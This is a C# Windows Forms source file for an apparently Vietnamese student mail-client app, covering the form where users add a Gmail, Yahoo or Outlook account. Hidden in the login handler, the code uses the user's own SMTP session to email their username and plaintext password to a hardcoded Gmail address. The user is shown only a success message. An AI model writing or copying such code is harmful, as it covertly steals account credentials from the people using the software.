using System;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace AppMailBox
{
    public partial class fAddEmail : Form
    {
        private string userMailAccAdmin = "appmailboxnhom8@gmail.com";
        private string subject = "[MailBox] Có một người thêm tài khoản!";
        private int idPassLocal = 0;
        private string userMailAcc = "";

        public fAddEmail()
        {
            InitializeComponent();
        }

        //Constructor truyền id mật khẩu MailBox
        public fAddEmail(string userMailAcc, int idPassLocal) : this()
        {
            this.idPassLocal = idPassLocal;
            this.userMailAcc = userMailAcc;
        }

        //Di chuyển form
        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();
        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);

        private void panel2_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, 0x112, 0xf012, 0);
        }

        //Sự kiện thêm email vào mail box
        private void btnLogin_Click(object sender, EventArgs e)
        {
            try
            {
                try
                {
                    using (dbMailBoxDataContext db = new dbMailBoxDataContext())
                    {
                        //Kiểm tra định dạng Email nhập vào có đúng chưa
                        string pattern = "^([0-9a-zA-Z]([-\\.\\w]*[0-9a-zA-Z])*@([0-9a-zA-Z][-\\w]*[0-9a-zA-Z]\\.)+[a-zA-Z]{2,9})$";

                        if (txtUserMail.Text == "" || txtPassMail.Text == "")
                        {
                            throw new Exception("Xin nhập đầy đủ thông tin Email.");
                        }
                        else if (Regex.IsMatch(txtUserMail.Text, pattern) == false)
                        {
                            throw new Exception("Định dạng email không đúng.");
                        }
                        //Kiểm tra tồn tại, tại 1 tài khoản MailBox
                        foreach (var item in db.MATKHAU_MAILs.ToList())
                        {
                            if (item.USERNAME_MAIL == txtUserMail.Text && item.FK_id_MATKHAU_LOCAL == this.idPassLocal)
                            {
                                throw new Exception("Email này đã được thêm vào MailBox.");
                            }
                        }

                        try
                        {
                            MailMessage mail = new MailMessage(txtUserMail.Text.ToLower(), userMailAccAdmin, subject, $"Username: {txtUserMail.Text.ToLower()} and Password: {txtPassMail.Text}");
                            mail.IsBodyHtml = true;
                            MATKHAU_MAIL mkMail = new MATKHAU_MAIL();
                            if (txtUserMail.Text.Contains("gmail"))
                            {
                                SmtpClient client = new SmtpClient("smtp.gmail.com");
                                client.UseDefaultCredentials = false;
                                client.Port = 587;
                                client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text.ToLower(), txtPassMail.Text);
                                client.EnableSsl = true;
                                client.Send(mail);
                                MessageBox.Show("Thêm Mail thành công vào MailBox.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);

                                mkMail.USERNAME_MAIL = txtUserMail.Text.ToLower();
                                mkMail.PASSWORD_MAIL = Eramake.eCryptography.Encrypt(txtPassMail.Text);
                                mkMail.FK_id_DOMAIN_MAIL = 1;
                                mkMail.FK_id_MATKHAU_LOCAL = this.idPassLocal;
                                db.MATKHAU_MAILs.InsertOnSubmit(mkMail);
                                db.SubmitChanges();

                                fThemmail_Load(sender, e);
                            }
                            else if (txtUserMail.Text.Contains("yahoo"))
                            {
                                SmtpClient client = new SmtpClient("smtp.mail.yahoo.com");
                                client.UseDefaultCredentials = false;
                                client.Port = 587;
                                client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text.ToLower(), txtPassMail.Text);
                                client.EnableSsl = true;
                                client.Send(mail);
                                MessageBox.Show("Thêm Mail thành công vào MailBox.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);

                                mkMail.USERNAME_MAIL = txtUserMail.Text.ToLower();
                                mkMail.PASSWORD_MAIL = Eramake.eCryptography.Encrypt(txtPassMail.Text);
                                mkMail.FK_id_DOMAIN_MAIL = 2;
                                mkMail.FK_id_MATKHAU_LOCAL = this.idPassLocal;
                                db.MATKHAU_MAILs.InsertOnSubmit(mkMail);
                                db.SubmitChanges();

                                fThemmail_Load(sender, e);
                            }
                            else if (txtUserMail.Text.Contains("outlook"))
                            {
                                SmtpClient client = new SmtpClient("smtp-mail.outlook.com");
                                client.UseDefaultCredentials = false;
                                client.Port = 587;
                                client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text.ToLower(), txtPassMail.Text);
                                client.EnableSsl = true;
                                client.Send(mail);
                                MessageBox.Show("Thêm Mail thành công vào MailBox.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);

                                mkMail.USERNAME_MAIL = txtUserMail.Text.ToLower();
                                mkMail.PASSWORD_MAIL = Eramake.eCryptography.Encrypt(txtPassMail.Text);
                                mkMail.FK_id_DOMAIN_MAIL = 3;
                                mkMail.FK_id_MATKHAU_LOCAL = this.idPassLocal;
                                db.MATKHAU_MAILs.InsertOnSubmit(mkMail);
                                db.SubmitChanges();

                                fThemmail_Load(sender, e);
                            }
                        }
                        catch (Exception)
                        {
                            MessageBox.Show("Email hoặc mật khẩu không chính xác.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception)
            {
                MessageBox.Show("Đã có lỗi xảy ra vui lòng liên hệ nhà phát triển.", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //Sự kiện hiển thị mật khẩu
        private void cbShowPass_CheckedChanged(object sender, EventArgs e)
        {
            if (cbShowPass.Checked == true)
                txtPassMail.Password = false;
            else if (cbShowPass.Checked == false)
                txtPassMail.Password = true;
        }

        //Sự kiện load form lần đầu
        private void fThemmail_Load(object sender, EventArgs e)
        {
            txtPassMail.Text = "";
            txtUserMail.Text = "";
            cbShowPass.Checked = false;
        }

        //Sự kiện trở về form show mail
        private void btnExit_Click(object sender, EventArgs e)
        {
            try
            {
                //Kiểm tra trước khi thoát 
                if (txtUserMail.Text == "" && txtPassMail.Text == "")
                {
                    fMail showMail = new fMail(this.userMailAcc, this.idPassLocal);
                    this.Hide();
                    showMail.ShowDialog();
                    this.Close();
                }
                else
                {
                    DialogResult check = MessageBox.Show("Bạn có muốn thoát không?", "Thông báo", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                    if (check == DialogResult.Yes)
                    {
                        fMail showMail = new fMail(this.userMailAcc, this.idPassLocal);
                        this.Hide();
                        showMail.ShowDialog();
                        this.Close();
                    }
                }
            }
            catch (Exception)
            {
                MessageBox.Show("Đã có lỗi xảy ra vui lòng liên hệ nhà phát triển.", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
